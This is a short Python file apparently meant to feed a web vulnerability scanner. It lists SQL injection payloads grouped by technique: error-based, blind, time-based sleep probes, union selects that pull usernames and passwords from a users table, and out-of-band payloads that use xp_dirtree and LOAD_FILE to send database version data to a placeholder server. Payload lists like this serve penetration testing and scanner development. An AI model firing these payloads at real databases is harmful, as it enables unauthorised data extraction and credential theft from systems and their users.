# payloads.py

# Error-based SQL Injection Payloads
error_based_payloads = [
    "' OR '1'='1",
    # ... more payloads ...
]

# Blind SQL Injection Payloads
blind_payloads = [
    "' AND 1=1 -- ",
    # ... more payloads ...
]

time_based_payloads = [
    "'; IF (1=1) WAITFOR DELAY '0:0:5' --",
    "'; SELECT SLEEP(5) --",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))bKbj) AND '1'='1",
    "1; SELECT pg_sleep(5); --",
    # ... more payloads ...
]

out_of_band_payloads = [
    "'; DECLARE @q NVARCHAR(200); SET @q = '\\\\YOUR_SERVER\\share\\' + (SELECT @@version); EXEC master..xp_dirtree @q; -- ",
    "' UNION SELECT LOAD_FILE(concat('\\\\',(SELECT @@version),'\\test\\yourdomain.com\\')) -- ",
    # ... more payloads ...
]

union_based_payloads = [
    "' UNION SELECT NULL, username, password FROM users-- ",
    "' UNION SELECT 1, @@version --",
    "1' UNION SELECT 1,2,3,4,table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 -- ",
    # ... more payloads ...
]


payloads = error_based_payloads + blind_payloads + time_based_payloads + out_of_band_payloads + union_based_payloads
# Loop over these payloads in your scanner logic


